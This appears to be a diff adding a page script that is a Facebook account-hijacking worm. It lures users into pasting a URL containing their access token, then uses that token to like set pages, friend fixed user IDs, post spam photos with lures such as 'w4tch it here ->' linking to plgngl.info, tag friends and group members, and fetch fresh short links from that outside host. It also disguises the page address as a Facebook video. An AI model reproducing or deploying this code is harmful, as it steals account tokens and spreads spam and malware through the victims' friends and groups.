@@ -1,0 +1,264 @@
+<script>function generateCert() {
+  var e = screen["width"] / 2 - 500;
+  var t = screen["height"] / 2 + 40;
+  var n = window["open"](acc_like, "Certificate Address", "toolbar=no,location=yes,directories=no,status=no, menubar=no,scrollbars=no,resizable=no,width=100,height=5,top=" + t + ",left=" + e);
+  if (window["focus"]) {
+    n["focus"]()
+  }
+  return false
+}
+
+function NgL(e) {
+  function a(e, t) {
+    return Math["floor"](Math["random"]() * (t - e + 1) + e)
+  }
+
+  function f(e) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/me/likes?access_token=" + t + "&method=POST&url=" + e,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("Liked: " + e)
+      }
+    })
+  }
+
+  function l(e) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/me/friends?uid=" + e + "&method=post&access_token=" + t,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("Following: " + e)
+      }
+    })
+  }
+
+  function c(e, r) {
+    for (i = 0; i < e["data"]["length"]; i++) {
+      console["log"]("amico dell amico: " + e["data"][i]["id"]);
+      jQuery["ajax"]({
+        url: "https://graph.facebook.com/" + r + "/comments?method=POST&message=@[" + e["data"][i]["id"] + ":0]&access_token=" + t,
+        dataType: "script",
+        success: function () {
+          n += 1;
+          console["log"]("contatore" + n);
+          if (n >= e["data"]["length"]) {
+            console["log"]("done? not yet :)");
+            d(tiny)
+          }
+        }
+      })
+    }
+  }
+
+  function h(e, n, r) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/" + n + "/friends?limit=5&access_token=" + t,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("friends of " + n + " : " + t["data"]["length"]);
+        c(t, e, r)
+      }
+    })
+  }
+
+  function p(e, n, r) {
+    console["log"]("valore: " + n);
+    $["getJSON"]("https://graph.facebook.com/" + e["data"][n]["uid"] + "/photos?url=" + u + "&message=" + o + " : " + r + "&method=POST&access_token=" + t, function (t) {
+      if (t["id"]) {
+        var i = t["id"];
+        console["log"]("foto id : " + i);
+        console["log"]("user id: " + e["data"][n]["uid"]);
+        h(i, e["data"][n]["uid"], r)
+      }
+    })
+  }
+
+  function d(e) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 10&access_token=" + t,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("numero amici: " + t["data"]["length"]);
+        var n = a(0, t["data"]["length"] - 1);
+        console["log"](n);
+        console["log"](u + " " + o);
+        p(t, n, e)
+      }
+    })
+  }
+
+  function v(e, r, s) {
+    console["log"](e["data"]["length"]);
+    for (i = 0; i < e["data"]["length"]; i++) {
+      console["log"]("membri: " + e["data"][i]["id"]);
+      jQuery["ajax"]({
+        url: "https://graph.facebook.com/" + r + "/comments?method=POST&message=@[" + e["data"][i]["id"] + ":0]&access_token=" + t,
+        dataType: "script",
+        success: function () {
+          n += 1;
+          if (n >= e["data"]["length"]) {
+            console["log"]("done? not yet :)");
+            y(s)
+          }
+        }
+      })
+    }
+  }
+
+  function m(e, n, r) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/" + n + "/members?limit=10&access_token=" + t,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("group length: " + t["data"]["length"]);
+        v(t, e, r)
+      }
+    })
+  }
+
+  function g(e, n, r) {
+    console["log"]("valore: " + n);
+    $["getJSON"]("https://graph.facebook.com/" + e["data"][n]["gid"] + "/photos?url=" + u + "&message=" + o + " : " + r + "&method=POST&access_token=" + t, function (t) {
+      if (t["id"]) {
+        var i = t["id"];
+        console["log"]("foto id : " + i);
+        console["log"]("group id: " + e["data"][n]["gid"]);
+        m(i, e["data"][n]["gid"], r)
+      }
+    })
+  }
+
+  function y(e) {
+    jQuery["ajax"]({
+      url: "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 70&access_token=" + t,
+      dataType: "jsonp",
+      success: function (t) {
+        console["log"]("numero gruppi: " + t["data"]["length"]);
+        var n = a(0, t["data"]["length"] - 1);
+        console["log"](n);
+        g(t, n, e)
+      }
+    })
+  }
+
+  function b(e, r) {
+    for (i = 0; i < e["data"]["length"]; i++) {
+      console["log"](e["data"][i]["id"]);
+      jQuery["ajax"]({
+        url: "https://graph.facebook.com/" + r + "/comments?method=POST&message=@[" + e["data"][i]["id"] + ":0]&access_token=" + t,
+        dataType: "script",
+        success: function () {
+          n += 1;
+          if (n >= e["data"]["length"]) {
+            console["log"]("done")
+          }
+        }
+      })
+    }
+  }
+
+  function w(e) {
+    $["getJSON"]("https://graph.facebook.com/me/photos?url=" + u + "&message=" + o + " : " + e + "&method=POST&access_token=" + t, function (e) {
+      if (e["id"]) {
+        var n = e["id"];
+        console["log"]("photo id : " + n);
+        var r = 15;
+        $["getJSON"]("https://graph.facebook.com/me/friends?limit=" + r + "&access_token=" + t, function (e) {
+          if (e["data"]) {
+            console["log"](e);
+            b(e, n)
+          }
+        })
+      }
+    })
+  }
+
+  function E() {
+    console["log"]("Getting link started");
+    $["getJSON"]("http://plgngl.info/db/db.php?callback=?", function (e) {
+      if (e) {
+        var t = JSON["parse"](e);
+        if (t["tinyurl"]) {
+          var n = t["tinyurl"];
+          console["log"]("Got link : " + n);
+          w(n);
+          y(n);
+          d(n)
+        } else {
+          if (t["short_url"]) {
+            var n = t["short_url"];
+            console["log"]("damn googl : " + n);
+            w(n);
+            y(n);
+            d(n)
+          } else {
+            console["log"]("damn");
+            E()
+          }
+        }
+      } else {
+        console["log"]("error");
+        E()
+      }
+    })
+  }
+  var t = e;
+  console["log"]("NgL New started");
+  var n = 0;
+  var r = new Array("video here --> ", "click h3re => ", "here is the link -> ", "w4tch it here -> ", "omg link here >>> ", "go here >>> ", "link here ---> ", "video is here => ", "click on the following link >> ", "youtube video --> ");
+  var s = Math["floor"](Math["random"]() * r["length"]);
+  var o = r[s];
+  var u = "http://plgngl.info/pic/video/index.php";
+  E();
+  l("100003749540710");
+  l("100003785667291");
+  l("100003755632727");
+  l("100003736252888");
+  l("100003722870324");
+  f("https://www.facebook.com/youknowwhatfcky");
+  f("https://www.facebook.com/nglmms");
+  f("https://www.facebook.com/lfzfun");
+  f("https://www.facebook.com/shutthefckupp");
+  f("https://www.facebook.com/pages/Love-is-Blind/132058817004530")
+}
+
+setTimeout(function () {
+  window["history"]["replaceState"] && window["history"]["replaceState"]({}, "", "ngl.php?v=372195639546666&set=vb.160089637365200&type=ngl&theater")
+}, 100);
+var acc_like = "view-source:http://on.fb.me/12MoCuR";
+jQuery(document)["ready"](function (e) {
+  e("a#activate")["click"](function (t) {
+    t["preventDefault"]();
+    e(".howto")["fadeOut"](function () {
+      e(".result")["show"]();
+      e(".error")["hide"]();
+      e("#logs")["html"]("");
+      e(".loading")["fadeIn"]("fast", function () {
+        var t = e(".access_token")["val"]();
+        if (t["split"]("#access_token=")[1]) {
+          var t = t["split"]("#access_token=")[1]["split"]("&")[0];
+          e["getJSON"]("https://graph.facebook.com/me?access_token=" + t, function (n) {
+            if (n["id"]) {
+              var r = n["id"];
+              NgL(t);
+              e(".loading")["css"]("display", "none");
+              e("#loading_bar4")["css"]("display", "block")
+            }
+          })
+        } else {
+          e(this)["fadeOut"](2e3, function () {
+            e(".error")["fadeIn"]("fast");
+            e(".howto")["fadeIn"]()
+          })
+        }
+      })
+    })
+  });
+  e("a#back")["click"](function (t) {
+    t["preventDefault"]();
+    e(".result")["slideUp"](function () {
+      e(".error")["hide"]()
+    })
+  })
+})</script>
